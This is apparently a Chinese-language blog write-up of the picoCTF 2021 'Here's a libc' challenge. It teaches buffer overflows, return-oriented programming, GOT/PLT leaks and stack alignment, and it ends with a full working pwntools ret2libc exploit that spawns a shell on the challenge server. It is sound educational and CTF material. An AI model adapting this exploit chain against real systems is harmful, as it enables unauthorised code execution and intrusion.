---
layout: post
title: 初試 Return-Oriented Programming - picoCTF 2021 Here's a libc
tags: [CTF, pwn]
---

> I am once again asking for you to pwn this binary.

## 探索
題目有附上執行檔、`libc.so.6`、Makefile，快速`checksec`看一下
```
❯ checksec vuln
[*] '/home/nick/coding/pico/Heres a libc/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./'
```
沒有stack canary，也就是沒有buffer overflow保護

有NX (Never eXecute)，看來沒有辦法在任意位置執行code，也就是只能利用binary裡面現有的東西

> Executable-space protection marks memory regions as non-executable, such that an attempt to execute machine code in these regions will cause an exception. It makes use of hardware features such as the NX bit (no-execute bit), or in some cases software emulation of those features.

沒有PIE (Position-Independent Executable)，也就是程式裡面函數的地址是固定的，不受ASLR影響

看一下`libc.so.6`，搞不好用得到
```
❯ checksec libc.so
[*] '/home/nick/coding/pico/Heres a libc/libc.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
重點是有PIE，也就是每次執行時libc載入的地址都不一樣，這比較麻煩

ghidra看一下，`main`裡面主要只進行`do_stuff()`的部份，內容就是把輸入做一些變更之後`puts`出來

```c
void do_stuff(void)

{
  char cVar1;
  undefined local_89;
  char local_88 [112];
  undefined8 local_18;
  ulong local_10;
  
  local_18 = 0;
  __isoc99_scanf("%[^\n]",local_88);
  __isoc99_scanf(&DAT_0040093a,&local_89);
  for (local_10 = 0; local_10 < 100; local_10 = local_10 + 1) {
    cVar1 = convert_case((int)local_88[local_10],local_10);
    local_88[local_10] = cVar1;
  }
  puts(local_88);
  return;
}
```

可以看到`scanf`用的是regular expression`[^\n]`，也就是match all直到碰到換行，基本上跟`gets`有一樣的行為，會不管長度硬塞，也就容易出問題

> One more reminder: the ‘%s’ and ‘%[’ conversions are dangerous if you don’t specify a maximum width or use the ‘a’ flag, because input too long would overflow whatever buffer you have provided for it. No matter how long your buffer is, a user could supply input that is longer.

把`libc.so.6`改成`libc.so`之後執行看看

{% include aligner.html images="posts/2021-08-17-return-oriented-programming/segfault.png" column=1 %}

喔果然廢了(?)

接個gdb看一下，crash並用`info frame`，可以發現return address被一堆`A`淹沒

{% include aligner.html images="posts/2021-08-17-return-oriented-programming/gdb-info-frame.png" column=1 %}

換句話說，掌握了stack就可以掌握**程式運行的流程**（此外也掌握了函數的參數，因為參數也放在stack上，並在被執行時放到register裡面）

既然有NX，那就沒有辦法隨便寫shellcode執行，看來只能是Return-Oriented Programming

---

## Return-Oriented Programming
> An attacker gains control of the call stack to hijack program control flow and then executes carefully chosen machine instruction sequences that are already present in the machine's memory, called "gadgets". Each gadget typically ends in a return instruction and is located in a subroutine within the existing program and/or shared library code. Chained together, these gadgets allow an attacker to perform arbitrary operations on a machine employing defenses that thwart simpler attacks.

也就是利用一系列含有`ret`的指令，配合可以改變register的指令(`pop`)，~~在程式裡面飛來飛去~~控制整個執行流程

一個典型的利用場景如下
```c
#include <stdio.h>
#include <stdlib.h>

char name[32];

int main() {
    printf("What's your name?\n");
    read(0, name, 32);

    printf("Hi %s\n", name);

    printf("The time is currently \n");
    system("/bin/date");

    char echo[100];
    printf("What do you want me to echo back?\n");
    read(0, echo, 1000);
    puts(echo);

    return 0;
}
```
可以看到`echo[100]`是一個很明顯的stack buffer overflow，因為`read`的限制長度超過`echo`可以放的大小，所以可以透過塞一堆垃圾把`ret`用的stack部份蓋掉，再填需要的地址，這樣在epilogue時就可以跳到想要執行的東西上

需要用到參數的話就比較麻煩了，在x86-64底下前六個參數需要透過指定的registers去傳（更多的參數還是先放stack上），順序分別為`RDI, RSI, RDX, RCX, R8, R9`

在沒有NX的情況下，可以直接填shellcode來達成寫入，但在NX的情況下只能利用現有的code來執行這個指令，也就是所謂的gadget

gadget通常位於函數的尾端，主要以`pop <reg>; ret`的形式出現，所以在覆蓋return address的過程中，把return address指向gadget之後就可以達成對register賦值的效果，而透過一系列gadget達成攻擊手段就是ROP的核心

## Position-Independent Execution
> Position-independent code (PIC) or position-independent executable (PIE) is a body of machine code that, being placed somewhere in the primary memory, executes properly regardless of its absolute address. PIC is commonly used for shared libraries, so that the same library code can be loaded in a location in each program address space where it does not overlap with other memory in use (for example, other shared libraries).

簡單來說就是，PIC可以執行於記憶體中任意位置，任何的尋址都是相對的，需要經過一定的轉換

轉換是如何進行的？轉換的核心是Global Offset Table (GOT)，內容為函數與真實地址的映射，由dynamic linker維護。對於shared library call，在不是`full RELRO`的情況下都是在第一次呼叫之後才會載入，也就是lazily loaded

在第一次呼叫之前，GOT中對應函數所指向的地址並不是函數本身（因為真正的函數地址還沒被解析），而是Procedure Linkage Table (PLT)中對應的函數，由PLT對應的函數作為中間人去call真正的函數

{% include aligner.html images="posts/2021-08-17-return-oriented-programming/got-plt.png" column=1 %}

這就是為什麼在disassemble的時候會出現`<函數@plt>`、`<函數@got.plt>`
```
gef➤  disassemble do_stuff 
Dump of assembler code for function do_stuff:
[...]
0x0000000000400769 <+145>:	call   0x400540 <puts@plt>
[...]
End of assembler dump.
gef➤  disassemble 0x400540
Dump of assembler code for function puts@plt:
   0x0000000000400540 <+0>:	 jmp   QWORD PTR [rip+0x200ad2] # 0x601018 <puts@got.plt>
   0x0000000000400546 <+6>:  push  0x0
   0x000000000040054b <+11>: jmp   0x400530
End of assembler dump.
```

---

## 攻擊
從ghidra來看這題的終極目標應該是要拿一個shell找flag，也就是return-to-libc

手上有的libc函數只有`puts`，理論上知道**函數在執行期的地址**加上**函數在library裡面的相對位置**就可以算出**library的base address**

目標是`system`函數，所以
```
libc_base = puts_runtime - puts_libc
system_runtime = libc_base + system_libc
```

把`main`反組譯可以看到`puts@plt`的地址在`0x400540`
```
0x0000000000400891 <+288>:	call   0x400540 <puts@plt>
```
注意到`vuln`沒有PIE，這個call的地址是固定的

這個指向的是plt的中間人函數，繼續反組譯
```
gef➤  disassemble 0x400540
Dump of assembler code for function puts@plt:
   0x0000000000400540 <+0>:	 jmp   QWORD PTR [rip+0x200ad2] # 0x601018 <puts@got.plt>
   0x0000000000400546 <+6>:  push  0x0
   0x000000000040054b <+11>: jmp   0x400530
End of assembler dump.
```
`puts@got.plt`的地址是`0x601018`，這個地址也是固定的，保存的值就是真正的`puts@GLIBC`的地址

所以現在的目標是把執行期`0x601018`的值印出來，「印出來」這件事本身問題不大，因為現在已經有辦法用`puts`

{% include aligner.html images="posts/2021-08-17-return-oriented-programming/exploit-1.png" column=1 %}

但問題是
```c
int puts(const char *s);
```
`puts`需要一個參數，這個參數需要放在`rdi`裡面

這個時候就需要gadget了，內容需要`pop rdi; ret`

使用ROPgadget看一下

{% include aligner.html images="posts/2021-08-17-return-oriented-programming/ropgadget-rdi.png" column=1 %}

`0x400913`那個看起來很好用

所以現在的執行流程長這個樣子

{% include aligner.html images="posts/2021-08-17-return-oriented-programming/exploit-2.png" column=1 %}

stack的安排如下

{% include aligner.html images="posts/2021-08-17-return-oriented-programming/stack-1.png" column=1 %}

運作模式為

{% include aligner.html images="posts/2021-08-17-return-oriented-programming/stack-1-1.png" column=1 %}

至於要塞多少垃圾，快速用`pattern create`跟`pattern search`看一下，被保存的return address顯示在`info frame`中
```
gef➤  info frame
Stack level 0, frame at 0x7fffffffda18:
 rip = 0x400770 in do_stuff; saved rip = 0x6261616b6261616a
 called by frame at 0x7fffffffda28
 Arglist at 0x6261616962616168, args: 
 Locals at 0x6261616962616168, Previous frame's sp is 0x7fffffffda20
 Saved registers:
  rip at 0x7fffffffda18
gef➤  pattern search 0x6261616b6261616a
[+] Searching for '0x6261616b6261616a'
[+] Found at offset 136 (little-endian search) likely
```
前面需要136個垃圾

第一階段的exploit長這樣，其中`puts`跟`system`的地址用`readelf -s [elf]`看
```py
# Phase 1
payload  = b'A'*136      # dummy
payload += p64(0x400913) # to gadget
payload += p64(0x601018) # value for rdi
payload += p64(0x400540) # to puts

r.sendline(payload)
r.recvline() # \n
r.recvline() # AaAaAa...
res = r.recvline().rstrip()

# Address calculation
puts_runtime = u64(res + b'\x00' * (8-len(res)) )
print(f'[1] puts_runtime = {hex(puts_runtime)}')
#  422: 0000000000080a30   512 FUNC   WEAK   DEFAULT   13 puts@@GLIBC_2.2.5
libc_base = puts_runtime - 0x80a30
print(f'[2] libc_base = {hex(libc_base)}')
# 1403: 000000000004f4e0    45 FUNC   WEAK   DEFAULT   13 system@@GLIBC_2.2.5
system_runtime = libc_base + 0x4f4e0
print(f'[3] system_runtime = {hex(system_runtime)}')
```
```
❯ python3 ./exploit-local.py
[+] Starting local process './vuln': pid 31852
[1] puts_runtime = 0x7f6ddd6935a0
[2] libc_base = 0x7f6ddd612b70
[3] system_runtime = 0x7f6ddd662050
[*] Stopped process './vuln' (pid 31852)

❯ python3 ./exploit-local.py
[+] Starting local process './vuln': pid 31857
[1] puts_runtime = 0x7f9031c5f5a0
[2] libc_base = 0x7f9031bdeb70
[3] system_runtime = 0x7f9031c2e050
[*] Stopped process './vuln' (pid 31857)
```
隨意運行兩次可以發現地址是不一樣的，但這是預期中的情況，因為libc有PIE

地址是拿到了，但程式也就這樣結束了，好不容易拿到的`system`還沒登場，而且下次再開地址也不一樣，所以勢必不能讓它就這樣死掉

那回到哪裡比較好？回到`do_stuff`是一個好選擇，可以持續利用buffer overflow繼續接下來的事情，所以在第一階段的最後加上`do_stuff`的地址讓`puts`的`ret`回到那邊

```py
# Phase 1
payload  = b'A'*136      # dummy
payload += p64(0x400913) # to gadget
payload += p64(0x601018) # value for rdi
payload += p64(0x400540) # to puts
payload += p64(0x4006d8) # to do_stuff

r.sendline(payload)
r.recvline() # \n
r.recvline() # AaAaAa...
res = r.recvline().rstrip()

# Address calculation
puts_runtime = u64(res + b'\x00' * (8-len(res)) )
print(f'[1] puts_runtime = {hex(puts_runtime)}')
#  422: 0000000000080a30   512 FUNC   WEAK   DEFAULT   13 puts@@GLIBC_2.2.5
libc_base = puts_runtime - 0x80a30
print(f'[2] libc_base = {hex(libc_base)}')
# 1403: 000000000004f4e0    45 FUNC   WEAK   DEFAULT   13 system@@GLIBC_2.2.5
system_runtime = libc_base + 0x4f4e0
print(f'[3] system_runtime = {hex(system_runtime)}')
```
---

第二階段的目標就是要call `system`，然後取得shell

`system`看起來只有一個參數，所以可以沿用上一個gadget

這次需要的參數是一個字串，或更正確的說，指向`"/bin/sh"`的pointer

`vuln`裡面不會有，所以要在libc裡面找
```
001b40f0  79 20 3d 3d 20 31 00 2d  63 00 2f 62 69 6e 2f 73  |y == 1.-c./bin/s|
001b4100  68 00 65 78 69 74 20 30  00 63 61 6e 6f 6e 69 63  |h.exit 0.canonic|
001b4110  61 6c 69 7a 65 2e 63 00  4d 53 47 56 45 52 42 00  |alize.c.MSGVERB.|
```
`libc_base+0x1b40fa`就有一串

所以這次的stack長這樣

{% include aligner.html images="posts/2021-08-17-return-oriented-programming/stack-2.png" column=1 %}

```py
# Phase 2
payload  = b'A'*136      # dummy
payload += p64(0x400913) # to gadget
payload += p64(libc_base+0x1b40fa) # pointer to "/bin/sh"
payload += p64(libc_base+0x4f4e0) # to system

r.sendline(payload)
r.interactive()
```

測試一下
```
❯ python3 ./exploit.py
[+] Starting local process './vuln': pid 15942
[*] [1] puts_runtime = 0x7f486d6235a0
[*] [2] libc_base = 0x7f486d5a2b70
[*] [3] system_runtime = 0x7f486d5f2050
[*] 00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000080  41 41 41 41  41 41 41 41  13 09 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
    00000090  1a a1 75 6d  48 7f 00 00  50 20 5f 6d  48 7f 00 00  │··um│H···│P _m│H···│
    000000a0
[*] Switching to interactive mode
AaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAAAAAAAAAAAAAAAAAAAAd
[*] Got EOF while reading in interactive
$ 
[*] Process './vuln' stopped with exit code -11 (SIGSEGV) (pid 15942)
[*] Got EOF while sending in interactive
Traceback (most recent call last):
  File "/home/nick/coding/pico/venv/lib/python3.9/site-packages/pwnlib/tubes/process.py", line 787, in close
    fd.close()
BrokenPipeError: [Errno 32] Broken pipe
```
~~果然是壞的~~

接個gdb看一下

{% include aligner.html images="posts/2021-08-17-return-oriented-programming/where-are-you-going.png" column=1 %}

~~大哥你要跳去哪裡啊~~

在程式還沒有crash前看一下memory map

{% include aligner.html images="posts/2021-08-17-return-oriented-programming/local-libc.png" column=1 %}

local的libc？

不同版本libc的offset不一樣，換個地址再戰
```py
# Address calculation
puts_runtime = u64(res + b'\x00' * (8-len(res)) )
log.info(f'[1] puts_runtime = {hex(puts_runtime)}')
# libc_base = puts_runtime - 0x80a30 # REMOTE
libc_base = puts_runtime - 0x875a0 # LOCAL
log.info(f'[2] libc_base = {hex(libc_base)}')
# system_runtime = libc_base + 0x4f4e0 #REMOTE
system_runtime = libc_base + 0x55410 # LOCAL
log.info(f'[3] system_runtime = {hex(system_runtime)}')
```

{% include aligner.html images="posts/2021-08-17-return-oriented-programming/into-system.png" column=1 %}

這次跳對地方了，不過

{% include aligner.html images="posts/2021-08-17-return-oriented-programming/do_system-segv.png" column=1 %}

還是壞的

到處Google之後突然發現這個東西

{% include aligner.html images="posts/2021-08-17-return-oriented-programming/google-system-alignment.png" column=1 %}

對齊問題？換個關鍵字之後才知道問題出在哪裡
> *The x86-64 System V ABI guarantees 16-byte stack alignment before a call, so libc system is allowed to take advantage of that for 16-byte aligned loads/stores. If you break the ABI, it's your problem if things crash.*
> 
> *`%rsp` The stack pointer holds the address of the byte with lowest address which is part of the stack. It is guaranteed to be 16-byte aligned at process entry.*

也就是在進行function call的時候，stack必須以16 bytes對齊，也就是`%rsp`必須為以`0`為結尾。任何的`pop`都是以8 bytes為單位移動，雖然大多數情況下都會自動調整，不過在亂搞的情況下還是有機會把地址弄壞

這邊的情況是
```
$rsp   : 0x00007ffe611337a8  →  0x2f2f2f2f2f2f2f2f ("////////"?)
```
結尾為8，也就是沒有對齊

解決方法也很簡單，在進到system以前多放一個`ret`讓`$rsp`減8就好，用`ROPgadget`可以找到非常符合需求的東西
```
0x000000000040052e : ret
```
把這個地址加到`/bin/sh`的後面，`system`的前面，最終payload長這樣
```py
# Phase 2
payload  = b'A'*136      # dummy
payload += p64(0x400913) # to gadget
payload += p64(libc_base+0x1b75aa) # pointer to "/bin/sh"
payload += p64(0x40052e) # stack alignment
payload += p64(system_runtime) # to system
```

{% include aligner.html images="posts/2021-08-17-return-oriented-programming/final-local.png" column=1 %}

本地成功了，那來試試遠端

{% include aligner.html images="posts/2021-08-17-return-oriented-programming/final-remote.png" column=1 %}

成功！最後的exploit長這樣
```py
from pwn import *

# r = process('./vuln')
# r = gdb.debug('./vuln', gdbscript='break do_stuff')
r = remote('mercury.picoctf.net', 37289)

r.recvuntil(b'sErVeR!') # welcome

# Phase 1
payload  = b'A'*136      # dummy
payload += p64(0x400913) # to gadget
payload += p64(0x601018) # value for rdi
payload += p64(0x400540) # to puts
payload += p64(0x4006d8) # to do_stuff

r.sendline(payload)
r.recvline() # \n
r.recvline() # AaAaAa...
res = r.recvline().rstrip()

# Address calculation
puts_runtime = u64(res + b'\x00' * (8-len(res)) )
log.info(f'[1] puts_runtime = {hex(puts_runtime)}')
libc_base = puts_runtime - 0x80a30 # REMOTE
# libc_base = puts_runtime - 0x875a0 # LOCAL
log.info(f'[2] libc_base = {hex(libc_base)}')
system_runtime = libc_base + 0x4f4e0 #REMOTE
# system_runtime = libc_base + 0x55410 # LOCAL
log.info(f'[3] system_runtime = {hex(system_runtime)}')

# Phase 2
payload  = b'A'*136      # dummy
payload += p64(0x400913) # to gadget
payload += p64(libc_base+0x1b40fa) # pointer to "/bin/sh", REMOTE
# payload += p64(libc_base+0x1b75aa) # pointer to "/bin/sh", LOCAL
payload += p64(0x40052e) # stack alignment
payload += p64(system_runtime) # to system

r.sendline(payload)
r.interactive()

# picoCTF{1_<3_sm4sh_st4cking_e900800fb4613d1e}
```

## 參考資料
- [https://blog.ovo.anderwei.net/archives/91](https://blog.ovo.anderwei.net/archives/91)
- [https://en.wikipedia.org/wiki/Executable_space_protection](https://en.wikipedia.org/wiki/Executable_space_protection)
- [https://www.gnu.org/software/libc/manual/html_node/String-Input-Conversions.html](https://www.gnu.org/software/libc/manual/html_node/String-Input-Conversions.html)
- [https://en.wikipedia.org/wiki/Return-oriented_programming](https://en.wikipedia.org/wiki/Return-oriented_programming)
- [https://ctf101.org/binary-exploitation/return-oriented-programming/](https://ctf101.org/binary-exploitation/return-oriented-programming/)
- [https://en.wikipedia.org/wiki/X86_calling_conventions#x86-64_calling_conventions](https://en.wikipedia.org/wiki/X86_calling_conventions#x86-64_calling_conventions)
- [https://en.wikipedia.org/wiki/Position-independent_code](https://en.wikipedia.org/wiki/Position-independent_code)
- [https://ctf101.org/binary-exploitation/what-is-the-got/](https://ctf101.org/binary-exploitation/what-is-the-got/)
- [https://stackoverflow.com/questions/54393105/libcs-system-when-the-stack-pointer-is-not-16-padded-causes-segmentation-faul](https://stackoverflow.com/questions/54393105/libcs-system-when-the-stack-pointer-is-not-16-padded-causes-segmentation-faul)
- [https://hack543.com/16-bytes-stack-alignment-movaps-issue/](https://hack543.com/16-bytes-stack-alignment-movaps-issue/)
- [https://uclibc.org/docs/psABI-x86_64.pdf](https://uclibc.org/docs/psABI-x86_64.pdf)